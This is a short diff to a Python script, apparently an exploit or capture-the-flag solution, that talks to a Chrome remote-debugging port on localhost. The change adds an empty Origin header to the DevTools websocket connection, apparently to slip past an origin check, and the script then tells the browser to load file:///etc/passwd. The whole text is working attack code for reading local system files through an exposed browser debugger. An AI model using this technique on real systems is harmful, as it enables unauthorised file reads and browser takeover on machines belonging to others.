@@ -28,7 +28,12 @@ def get_current_html(ws):
 targets = requests.get("http://localhost:34445/json").json()
 websocket_url = targets[0]["webSocketDebuggerUrl"]
 
-ws = websocket.create_connection(websocket_url)
+
+headers = {
+    'Origin': ''
+}
+
+ws = websocket.create_connection(websocket_url, header=headers)
 sleep(1)
 print(page_navigate(ws, "file:///etc/passwd"))
 sleep(3)
